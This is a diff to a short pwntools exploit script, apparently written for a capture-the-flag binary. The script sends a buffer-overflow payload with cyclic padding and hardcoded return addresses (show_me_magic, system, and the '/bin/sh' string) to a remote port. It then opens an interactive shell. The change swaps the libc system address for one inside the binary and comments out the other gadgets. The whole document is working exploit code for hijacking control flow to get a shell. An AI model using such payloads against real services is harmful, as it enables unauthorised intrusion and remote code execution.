@@ -15,12 +15,12 @@ port = 11002
 r = remote(ip, port)
 payload = "aaaabaaacaaadaaaeaaafaaa"
 # show_me_magic = 0x0000000000400627
-payload += "\x27\x06\x40\x00\x00\x00\x00\x00"
-# system = 0x7ffff7e3fed0
-payload += "\xd0\xfe\xe3\xf7\xff\x7f"
+# payload += "\x27\x06\x40\x00\x00\x00\x00\x00"
+# system = 0x0000000000400510
+payload += p64(0x0000000000400510)
 # exit = 0x7ffff7e35720
 # payload += "\x20\x57\xe3\xf7\xff\x7f"
 # /bin/sh = 0x7ffff7f7ccee 
-payload += "\xee\xcc\xf7\xf7\xff\x7f"
+# payload += "\xee\xcc\xf7\xf7\xff\x7f"
 r.sendline(payload)
 r.interactive()
